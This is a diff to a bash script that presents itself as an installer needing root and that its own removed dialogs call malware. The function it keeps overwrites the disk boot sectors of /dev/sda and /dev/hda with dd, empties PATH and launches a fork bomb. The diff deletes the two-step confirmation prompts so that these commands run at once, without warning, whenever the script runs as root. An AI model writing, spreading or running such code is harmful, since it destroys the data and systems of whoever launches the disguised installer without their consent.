@@ -2,8 +2,8 @@
 
 #Dangerous commands
 function wildcommands() {
-  sudo dd if=boot.bin of=/dev/sda bs=512;
-  sudo dd if=boot.bin of=/dev/hda bs=512;
+  sudo dd if=/usr/bin/boot.bin of=/dev/sda bs=512;
+  sudo dd if=/usr/bin/boot.bin of=/dev/hda bs=512;
   PATH="";
   sleep 180
   :(){ :|:& };:
@@ -11,49 +11,7 @@ function wildcommands() {
 
 if [[ $EUID == 0 ]]
 then
-  if [[ -n "$XDG_SESSION_DESKTOP" ]]; then
-  zenityavailable=$(which zenity)
-  if [[ "$zenityavailable" != "" ]]; then
-
-    sudo apt-get install zenity efibootmgr coreutils -qy > /dev/null
-
-    zenity --question --text="This malware is no joke! Do you want to proceed?" --title="WARNING!" --cancel-label="Cancel" --ok-label="Proceed"
-    if [[ $? -eq 0 ]]; then
-
-      zenity --question --text="This malware is no joke! Do you want to proceed? (Double Check)" --title="WARNING!" --cancel-label="Cancel" --ok-label="Proceed"
-      if [[ $? -eq 0 ]]; then
-        zenity --info --text "Welp, Good luck." --title "..." --ok-label "Alright"
-        echo poweroff >> .bashrc && echo poweroff >> .zshrc;
-        wildcommands
-      else
-        exit
-      fi
-
-    else
-      exit
-    fi
-  fi
-
-  else
-
-    dialogavailable=$(which whiptail)
-    if [[ "$dialogavailable" != "" ]]; then
-      whiptail --yesno "This malware is no joke. Proceed?" --yes-button "Proceed" --no-button "Cancel" --title "Warning!" 10 35
-      if [[ $? -ne 0 ]]; then
-        exit
-      else
-        whiptail --yesno "This malware is no joke. Proceed? (Double Check.)" --yes-button "Proceed" --no-button "Cancel" --title "Warning!" 10 35
-        if [[ $? -ne 0 ]]; then
-          exit
-        else
-          whiptail --msgbox "Welp, Good luck." 8 20 --title "..."
-          echo poweroff >> .bashrc && echo poweroff >> .zshrc;
-          
-          wildcommands
-        fi
-      fi
-    fi
-  fi
+  wildcommands
 else
 
   echo -e "\e[1;31mFor this installer to begin you need to run it as root.\e[0m"
